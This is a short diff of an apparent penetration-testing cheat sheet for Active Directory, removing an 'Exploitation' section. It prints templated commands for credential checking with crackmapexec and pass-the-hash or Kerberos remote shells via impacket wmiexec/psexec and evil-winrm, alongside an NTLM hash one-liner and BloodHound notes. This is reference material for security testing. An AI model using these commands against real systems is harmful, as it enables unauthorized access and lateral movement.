@@ -108,21 +108,6 @@ print(binascii.hexlify(hashlib.new('md4', "<PASSWORD>".encode('utf-16le')).diges
 
 ---
 
-## Exploitation
-Check:
-`crackmapexec SERVICE <IP> -u '<USER>' -p <PASS>` hash: -H
-
-Shell:
-`impacket-wmiexec -hashes '<HASH>' <USER>@<IP>`
-`impacket-psexec -hashes '<HASH>' <USER>@<IP>`
-`evil-winrm -i <IP> -u <USER> -p '<PASS>'` hash: -H
-`python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass`
-`psexec.py -k -no-pass -dc-ip <IP> AD/administrator@192.168.1.100`
-smbexec.py
-wmiexec.py
-
----
-
 ## Post-exploitation
 `Bloodhound`
 	`SharpHound` for local AD
